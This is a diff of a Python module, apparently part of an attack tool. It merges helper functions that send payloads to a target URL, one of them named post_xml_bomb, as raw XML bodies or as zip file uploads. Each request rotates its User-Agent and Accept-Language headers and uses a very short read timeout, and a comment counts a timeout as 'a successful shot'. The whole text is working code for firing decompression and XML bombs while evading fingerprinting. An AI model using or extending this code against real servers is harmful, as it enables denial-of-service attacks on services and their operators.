@@ -6,23 +6,7 @@ from random import choice
 from requests import post
 from requests.exceptions import ReadTimeout, RequestException
 
-def post_file_upload(dst_url, filename, payload_bytes, user_agents, accept_lang, content_type="application/zip"):
-    try:
-        headers = {
-            "User-Agent": choice(user_agents),
-            "Accept-Language": choice(accept_lang),
-            "Connection": "close",
-        }
-        files = {'file': (filename, payload_bytes, content_type)}
-        post(dst_url, files=files, headers=headers, timeout=(3, 0.1))
-        return True
-    except ReadTimeout:
-        return True          # body was sent; we just didn't wait — this is a successful shot
-    except RequestException:
-        return False
-
-
-def post_xml_bomb(dst_url, payload_bytes, user_agents, accept_lang, content_type="application/xml"):
+def post_upload(dst_url, filename, payload_bytes, user_agents, accept_lang, content_type):
     try:
         headers = {
             "User-Agent": choice(user_agents),
@@ -30,10 +14,11 @@ def post_xml_bomb(dst_url, payload_bytes, user_agents, accept_lang, content_type
             "Content-Type": content_type,
             "Connection": "close",
         }
-        post(dst_url, data=payload_bytes, headers=headers, timeout=(3, 0.1))
+        files = {'file': (filename, payload_bytes, content_type)}
+        post(dst_url, files=files, headers=headers, timeout=(3, 0.1))
         return True
     except ReadTimeout:
-        return True          
+        return True
     except RequestException:
         return False
 
